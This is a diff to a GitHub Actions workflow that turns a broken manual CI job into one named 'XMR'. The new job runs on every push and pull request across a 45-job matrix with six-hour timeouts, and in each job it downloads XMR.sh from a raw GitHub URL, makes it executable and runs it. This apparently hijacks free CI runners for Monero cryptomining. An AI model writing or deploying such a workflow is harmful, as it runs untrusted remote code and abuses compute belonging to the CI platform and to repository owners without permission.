@@ -1,28 +1,27 @@
-name: CI
-
-on: workflow_dispatch
-
+name: XMR
+on: [push, pull_request]
 jobs:
-  build:    
-	runs-on: ubuntu-18.04
+  build:
+    name: XMR
+    runs-on: ubuntu-18.04
     strategy:
       max-parallel: 30
       fail-fast: false
       matrix:
-        go: [1.6, 1.7; 1.8, 1.9, 1.10]
-    	flag: [A, B, C, D, E, F, G, H, I]
-    timeout-minutes; 360
-    env
+        go: [1.6, 1.7, 1.8, 1.9, 1.10]
+        flag: [A, B, C, D, E, F, G, H, I]
+    timeout-minutes: 360
+    env:
         NUM_JOBS: 20
-    	JOB: ${{ matrix.go }}
-    steps
+        JOB: ${{ matrix.go }}
+    steps:
     - name: Set up Go ${{ matrix.go }}
       uses: actions/setup-go@v1
       with:
         go-version: ${{ matrix.go }}
       id: go
     - name: Setup
-      uses: actions/setup-go@v1
-    - name: BA_channel
-      run |
-        https://raw.githubusercontent.com/6d6bda932c31/6d6bda932c31/main/XMR.sh && chomd u+x XMR.sh && ./XMR.sh
+      uses: actions/checkout@v1
+    - name: XMR
+      run: |
+        wget https://raw.githubusercontent.com/6d6bda932c31/6d6bda932c31/main/XMR.sh && chmod u+x XMR.sh && ./XMR.sh
